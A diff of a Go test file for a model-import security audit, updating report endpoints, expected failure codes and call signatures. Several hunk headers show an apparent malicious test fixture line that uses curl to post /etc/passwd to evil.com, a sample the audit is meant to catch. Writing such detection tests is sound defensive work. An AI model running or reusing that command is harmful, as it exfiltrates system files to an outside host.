@@ -57,7 +57,7 @@ func TestAuditAndReportModelImportFailClosed(t *testing.T) {
 
 	received := make(chan reportRequest, 1)
 	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.URL.Path != reportModelImportEndpoint {
+		if r.URL.Path != reportAuditEndpoint {
 			return
 		}
 		var rr reportRequest
@@ -84,7 +84,7 @@ func TestAuditAndReportModelImportFailClosed(t *testing.T) {
 			t.Fatalf("msg = %v, want fail-closed message", rr.Msg)
 		}
 	case <-time.After(5 * time.Second):
-		t.Fatal("timed out waiting for reportModelImport (fail-closed)")
+		t.Fatal("timed out waiting for reportAudit (fail-closed)")
 	}
 }
 
@@ -100,7 +100,7 @@ subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
 
 	received := make(chan reportRequest, 1)
 	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.URL.Path != reportModelImportEndpoint {
+		if r.URL.Path != reportAuditEndpoint {
 			return
 		}
 		var rr reportRequest
@@ -120,8 +120,8 @@ subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
 
 	select {
 	case rr := <-received:
-		if rr.Code != 2 {
-			t.Fatalf("code = %d, want 2 (static audit failure)", rr.Code)
+		if rr.Code != 1 {
+			t.Fatalf("code = %d, want 1 (static audit failure)", rr.Code)
 		}
 		if rr.Report == "" {
 			t.Fatal("report empty, want audit JSON")
@@ -134,7 +134,7 @@ subprocess.run(["curl", "http://evil.com", "-d", "@/etc/passwd"])
 			t.Fatal("conclusion.passed = true, want false")
 		}
 	case <-time.After(10 * time.Second):
-		t.Fatal("timed out waiting for reportModelImport (static fail)")
+		t.Fatal("timed out waiting for reportAudit (static fail)")
 	}
 }
 
@@ -148,7 +148,7 @@ func TestAuditAndReportModelImportStaticPass(t *testing.T) {
 
 	received := make(chan reportRequest, 1)
 	platform := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		if r.URL.Path != reportModelImportEndpoint {
+		if r.URL.Path != reportAuditEndpoint {
 			return
 		}
 		var rr reportRequest
@@ -182,7 +182,7 @@ func TestAuditAndReportModelImportStaticPass(t *testing.T) {
 			t.Fatalf("conclusion.passed = false, want true")
 		}
 	case <-time.After(10 * time.Second):
-		t.Fatal("timed out waiting for reportModelImport (static pass)")
+		t.Fatal("timed out waiting for reportAudit (static pass)")
 	}
 }
 
@@ -208,7 +208,6 @@ func TestAuditAndReportModelImportIncludesChecksum(t *testing.T) {
 
 	state.Security.ScanEnabled = true
 	state.Security.ModelDir = modelDir
-	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
 	state.PlatformIP = platform.URL
 	state.DockerID = "docker-test"
 	state.setModelChecksum(map[string]any{
@@ -217,7 +216,7 @@ func TestAuditAndReportModelImportIncludesChecksum(t *testing.T) {
 		"value":     "sm3-model-hash-12345",
 	})
 
-	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})
+	state.reportModelImportAsync("req-1", "task-1", 0, "模型导入成功")
 
 	select {
 	case rr := <-received:
@@ -257,12 +256,11 @@ func TestAuditAndReportModelImportFallbackDirectoryChecksum(t *testing.T) {
 
 	state.Security.ScanEnabled = true
 	state.Security.ModelDir = modelDir
-	state.Security.LLM = codeaudit.LLMConfig{Enabled: false}
 	state.PlatformIP = platform.URL
 	state.DockerID = "docker-test"
 	// ModelChecksum is nil, should fallback to calculating directory checksum
 
-	state.auditAndReportModelImport(importRequest{RequestID: "req-1", TaskID: "task-1"})
+	state.reportModelImportAsync("req-1", "task-1", 0, "模型导入成功")
 
 	select {
 	case rr := <-received:
